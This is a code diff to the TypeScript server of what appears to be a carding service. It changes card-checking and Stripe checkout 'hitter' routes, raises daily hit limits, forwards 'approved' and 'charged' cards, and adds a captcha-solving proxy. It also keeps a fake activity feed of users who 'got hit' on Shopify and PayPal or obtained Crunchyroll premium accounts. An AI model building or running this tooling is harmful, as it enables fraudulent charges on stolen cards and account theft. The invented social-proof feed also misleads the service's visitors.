@@ -277,7 +277,7 @@ const TIER_LIMITS: Record<UserTier, TierLimits> = {
     massAccountMax: 1,
     dailyFindsiteSearches: 0,
     parallelWorkers: 1,
-    dailyHitterHits: 2,
+    dailyHitterHits: 10,
   },
   silver: {
     dailyChecks: 5000,
@@ -442,7 +442,7 @@ function checkIpHitterLimit(ip: string): { allowed: boolean; used: number } {
   const today = getTodayStr();
   const entry = dailyIpHitterUsage.get(ip);
   if (!entry || entry.date !== today) return { allowed: true, used: 0 };
-  return { allowed: entry.count < 2, used: entry.count };
+  return { allowed: entry.count < 10, used: entry.count };
 }
 
 function incrementIpHitterUsage(ip: string) {
@@ -824,7 +824,7 @@ export async function registerRoutes(
       { type: "login", userName: "Mike", userId: "demo3", message: "Mike just logged in" },
       { type: "premium", userName: "John", userId: "demo4", message: "John Bought Premium ⭐" },
       { type: "account_hit", userName: "Emma", userId: "demo5", message: "Emma Got Account Hit ⚡", detail: "Crunchyroll — Premium Account" },
-      { type: "hit", userName: "Dev", userId: "demo6", message: "Dev Got Hit ⚡", detail: "Charged — Shopify Native" },
+      { type: "hit", userName: "Dev", userId: "demo6", message: "Dev Got Hit ⚡", detail: "Charged — Shopify" },
       { type: "login", userName: "Lisa", userId: "demo7", message: "Lisa just logged in" },
       { type: "hit", userName: "Omar", userId: "demo8", message: "Omar Got Hit ⚡", detail: "Charged — PayPal Charge $1" },
     ];
@@ -881,6 +881,7 @@ export async function registerRoutes(
     res.setHeader("Pragma", "no-cache");
     res.setHeader("Surrogate-Control", "no-store");
     Object.defineProperty(req, "fresh", { get: () => false, configurable: true });
+
     if (!req.session?.userId) {
       return res.json({ authenticated: false });
     }
@@ -1417,6 +1418,107 @@ export async function registerRoutes(
     }
   });
 
+  // ── Custom Captcha API (UsagiAutoX) ──────────────────────────────────────
+  const CUSTOM_CAPTCHA_API = "https://gold-newt-367030.hostingersite.com/api.php";
+
+  // GET — return current local custom captcha config
+  app.get("/api/admin/custom-captcha", requireAdmin, (_req, res) => {
+    try {
+      let cfg: Record<string, any> = {};
+      try { cfg = JSON.parse(fs.readFileSync(CAPTCHA_KEYS_PATH, "utf-8")); } catch {}
+      res.json({
+        token: cfg.custom_captcha_token || "",
+        url: cfg.custom_captcha_url || CUSTOM_CAPTCHA_API,
+        enabled: !!cfg.custom_captcha_token,
+      });
+    } catch {
+      res.json({ token: "", url: CUSTOM_CAPTCHA_API, enabled: false });
+    }
+  });
+
+  // PUT — save custom captcha token + url locally
+  app.put("/api/admin/custom-captcha", requireAdmin, (req, res) => {
+    try {
+      const { token, url } = req.body;
+      let cfg: Record<string, any> = {};
+      try { cfg = JSON.parse(fs.readFileSync(CAPTCHA_KEYS_PATH, "utf-8")); } catch {}
+      if (token !== undefined) cfg.custom_captcha_token = String(token).trim();
+      if (url !== undefined) cfg.custom_captcha_url = String(url).trim() || CUSTOM_CAPTCHA_API;
+      fs.writeFileSync(CAPTCHA_KEYS_PATH, JSON.stringify(cfg, null, 2));
+      _configJsonCache = null;
+      res.json({ success: true });
+    } catch (err: any) {
+      res.status(500).json({ message: err.message });
+    }
+  });
+
+  // POST — proxy to external API: get/set provider settings
+  app.post("/api/admin/custom-captcha/providers", requireAdmin, async (req, res) => {
+    try {
+      let cfg: Record<string, any> = {};
+      try { cfg = JSON.parse(fs.readFileSync(CAPTCHA_KEYS_PATH, "utf-8")); } catch {}
+      const authToken = cfg.custom_captcha_token || "";
+      if (!authToken) {
+        return res.status(400).json({ message: "Custom captcha token not set. Set it first." });
+      }
+      const apiUrl = cfg.custom_captcha_url || CUSTOM_CAPTCHA_API;
+      const { action_type, provider, api_key, enabled, timeout, poll_interval, username, password } = req.body;
+
+      if (action_type === "get") {
+        const resp = await fetch(`${apiUrl}?action=admin-captcha-keys`, {
+          method: "POST",
+          headers: { "Content-Type": "application/json" },
+          body: JSON.stringify({ token: authToken, action_type: "get" }),
+        });
+        const data = await resp.json() as any;
+        return res.json(data);
+      }
+
+      if (action_type === "set") {
+        const body: Record<string, any> = {
+          token: authToken,
+          action_type: "set",
+          provider: provider || "",
+          api_key: api_key || "",
+          enabled: enabled !== false ? "true" : "false",
+          timeout: String(timeout || 120),
+          poll_interval: String(poll_interval || 5),
+        };
+        if (username) body.username = username;
+        if (password) body.password = password;
+        const resp = await fetch(`${apiUrl}?action=admin-captcha-keys`, {
+          method: "POST",
+          headers: { "Content-Type": "application/json" },
+          body: JSON.stringify(body),
+        });
+        const data = await resp.json() as any;
+        return res.json(data);
+      }
+
+      res.status(400).json({ message: "Invalid action_type. Use 'get' or 'set'" });
+    } catch (err: any) {
+      res.status(500).json({ message: err.message || "Failed to reach custom captcha API" });
+    }
+  });
+
+  // GET — check custom captcha API status/balance
+  app.get("/api/admin/custom-captcha/status", requireAdmin, async (_req, res) => {
+    try {
+      let cfg: Record<string, any> = {};
+      try { cfg = JSON.parse(fs.readFileSync(CAPTCHA_KEYS_PATH, "utf-8")); } catch {}
+      const authToken = cfg.custom_captcha_token || "";
+      const apiUrl = cfg.custom_captcha_url || CUSTOM_CAPTCHA_API;
+      if (!authToken) {
+        return res.json({ online: false, message: "No token set" });
+      }
+      const resp = await fetch(`${apiUrl}?action=captcha-balance&token=${encodeURIComponent(authToken)}&provider=2captcha`);
+      const data = await resp.json() as any;
+      res.json({ online: data.success !== false, ...data });
+    } catch (err: any) {
+      res.json({ online: false, error: err.message });
+    }
+  });
+
   // ── Logs Group config ────────────────────────────────────────────────────
   const LOGS_CFG_PATH = path.join(process.cwd(), "bot", "config.json");
   app.get("/api/admin/logs-config", requireAdmin, (_req, res) => {
@@ -1569,7 +1671,7 @@ export async function registerRoutes(
       }
       const botDir = path.resolve(process.cwd(), "bot");
       const checkerScript = path.join(botDir, "web_checker.py");
-      const spawnTimeout = ["auto", "autoskool"].includes(gateway) ? 130000 : 70000;
+    const spawnTimeout = ["auto", "autoskool", "shp"].includes(gateway) ? 130000 : 70000;
 
       try {
         const result = await new Promise<string>((resolve, reject) => {
@@ -1668,6 +1770,14 @@ export async function registerRoutes(
     status: string;
     response: string;
     timestamp: number;
+    gateway?: string;
+    site?: string;
+    amount?: string | number | null;
+    confidence?: number | null;
+    explanation?: string;
+    card_type?: string;
+    card_bin?: string;
+    card_last4?: string;
   }
 
   interface CheckJob {
@@ -1701,7 +1811,7 @@ export async function registerRoutes(
     }
   }, 5 * 60 * 1000);
 
-  async function runCardCheck(gateway: string, card: string, userId: string, isAdmin: boolean): Promise<{ status: string; response: string }> {
+  async function runCardCheck(gateway: string, card: string, userId: string, isAdmin: boolean): Promise<{ status: string; response: string; gateway?: string; site?: string; amount?: string | number | null; confidence?: number | null; explanation?: string; card_type?: string; card_bin?: string; card_last4?: string }> {
     const botDir = path.resolve(process.cwd(), "bot");
     const checkerScript = path.join(botDir, "web_checker.py");
     const spawnTimeout = ["auto", "autoskool"].includes(gateway) ? 130000 : 70000;
@@ -1787,6 +1897,14 @@ export async function registerRoutes(
             status: result.status || "unknown",
             response: result.response || "",
             timestamp: Date.now(),
+            gateway: result.gateway,
+            site: result.site,
+            amount: result.amount,
+            confidence: result.confidence,
+            explanation: result.explanation,
+            card_type: result.card_type,
+            card_bin: result.card_bin,
+            card_last4: result.card_last4,
           });
 
           const resultResponse = result.response || result.status || "";
@@ -2459,12 +2577,12 @@ export async function registerRoutes(
       if (hitterCheck.limit !== -1) {
         const ipCheck = checkIpHitterLimit(reqIp);
         if (!ipCheck.allowed) {
-          return res.status(429).json({ error: "HITTER_LIMIT_REACHED", limit: 2, used: ipCheck.used, reason: "IP daily limit reached" });
-        }
+        return res.status(429).json({ error: "HITTER_LIMIT_REACHED", limit: 10, used: ipCheck.used, reason: "IP daily limit reached" });
       }
+    }
 
-      const botDir = path.resolve(process.cwd(), "bot");
-      const script = path.join(botDir, "web_stripe_co.py");
+    const botDir = path.resolve(process.cwd(), "bot");
+    const script = path.join(botDir, "web_stripe_co.py");
 
       const args = ["-u", script, checkoutUrl, card];
       const allowedCacheKeys = ["pk", "session_id", "merchant", "amount", "currency",
@@ -2541,7 +2659,7 @@ export async function registerRoutes(
       const cardClean = card.replace(/\|/g, "|");
       const userName = [req.session?.firstName, req.session?.lastName].filter(Boolean).join(" ") || req.session?.username || req.session?.userId || "";
 
-      if (data.status === "charged" && req.session?.userId) {
+      if ((data.status === "charged" || data.status === "approved") && req.session?.userId) {
         const botDir2 = path.resolve(process.cwd(), "bot");
         const forwardScript = path.join(botDir2, "web_forward_hit.py");
         const freshCache = data.session_cache || {};
@@ -2605,7 +2723,7 @@ export async function registerRoutes(
       if (hitterCheck.limit !== -1) {
         const ipCheck = checkIpHitterLimit(reqIp);
         if (!ipCheck.allowed) {
-          return res.status(429).json({ error: "HITTER_LIMIT_REACHED", limit: 2, used: ipCheck.used, reason: "IP daily limit reached" });
+          return res.status(429).json({ error: "HITTER_LIMIT_REACHED", limit: 10, used: ipCheck.used, reason: "IP daily limit reached" });
         }
       }
 
@@ -2687,7 +2805,7 @@ export async function registerRoutes(
       const cardClean = card.replace(/\|/g, "|");
       const userName = [req.session?.firstName, req.session?.lastName].filter(Boolean).join(" ") || req.session?.username || req.session?.userId || "";
 
-      if (data.status === "charged" && req.session?.userId) {
+      if ((data.status === "charged" || data.status === "approved") && req.session?.userId) {
         const botDir2 = path.resolve(process.cwd(), "bot");
         const forwardScript = path.join(botDir2, "web_forward_hit.py");
         const freshCache = data.session_cache || {};
@@ -2749,7 +2867,7 @@ export async function registerRoutes(
       if (billingHitterCheck.limit !== -1) {
         const billingIpCheck = checkIpHitterLimit(billingReqIp);
         if (!billingIpCheck.allowed) {
-          return res.status(429).json({ error: "HITTER_LIMIT_REACHED", limit: 2, used: billingIpCheck.used, reason: "IP daily limit reached" });
+          return res.status(429).json({ error: "HITTER_LIMIT_REACHED", limit: 10, used: billingIpCheck.used, reason: "IP daily limit reached" });
         }
       }
 
@@ -3739,6 +3857,8 @@ export async function registerRoutes(
       return res.status(400).json({ error: "You cannot refer yourself" });
     }
 
+    const isAdmin = isAdminUser(userId);
+
     // Check referrer is a known user — look in users.json (bot users), referrals.json
     // (web users who viewed their referral page), and user_tiers.json (paid users).
     const usersFile = path.join(path.resolve(process.cwd(), "bot"), "users.json");
@@ -3753,8 +3873,8 @@ export async function registerRoutes(
       return res.status(404).json({ error: "Referral code does not belong to a known user" });
     }
 
-    // ── Channel & Group membership check ────────────────────────────────────
-    if (!isAdminUser(userId)) {
+    // ── Channel & Group membership check (skip for admin) ─────────────────────
+    if (!isAdmin) {
       try {
         const botDir = path.resolve(process.cwd(), "bot");
         const checkScript = path.join(botDir, "check_member.py");
@@ -3793,31 +3913,35 @@ export async function registerRoutes(
       return res.status(400).json({ error: "You have already used a referral code" });
     }
 
-    // ── IP Anti-Abuse ───────────────────────────────────────────────────────
-    const ip = getClientIp(req);
-    const MAX_REFERRALS_PER_IP = 2; // max accounts allowed to apply a referral from same IP
+    // ── IP Anti-Abuse (skip for admin) ──────────────────────────────────────
+    if (!isAdmin) {
+      const ip = getClientIp(req);
+      const MAX_REFERRALS_PER_IP = 2;
 
-    if (ip !== "unknown" && ip !== "::1" && ip !== "127.0.0.1") {
-      if (!data.ipUsed) data.ipUsed = {};
-      const ipEntries = data.ipUsed[ip] || [];
+      if (ip !== "unknown" && ip !== "::1" && ip !== "127.0.0.1") {
+        if (!data.ipUsed) data.ipUsed = {};
+        const ipEntries = data.ipUsed[ip] || [];
 
-      if (ipEntries.length >= MAX_REFERRALS_PER_IP) {
-        return res.status(403).json({
-          error: "Referral rejected: too many accounts registered from this IP address.",
-        });
+        if (ipEntries.length >= MAX_REFERRALS_PER_IP) {
+          return res.status(403).json({
+            error: "Referral rejected: too many accounts registered from this IP address.",
+          });
+        }
       }
     }
     // ── End IP Anti-Abuse ───────────────────────────────────────────────────
 
-    // ── New user account age check ──────────────────────────────────────────
-    const newUserEntry = knownUsers[userId];
-    if (newUserEntry?.joined_at) {
-      const joined = new Date(newUserEntry.joined_at).getTime();
-      const ageDays = Math.floor((Date.now() - joined) / 86400000);
-      if (ageDays < 3 && !isAdminUser(userId)) {
-        return res.status(403).json({
-          error: `Your account must be at least 3 days old to use a referral code. Come back in ${3 - ageDays} day(s).`,
-        });
+    // ── New user account age check (skip for admin) ─────────────────────────
+    if (!isAdmin) {
+      const newUserEntry = knownUsers[userId];
+      if (newUserEntry?.joined_at) {
+        const joined = new Date(newUserEntry.joined_at).getTime();
+        const ageDays = Math.floor((Date.now() - joined) / 86400000);
+        if (ageDays < 3) {
+          return res.status(403).json({
+            error: `Your account must be at least 3 days old to use a referral code. Come back in ${3 - ageDays} day(s).`,
+          });
+        }
       }
     }
     // ── End new user age check ──────────────────────────────────────────────
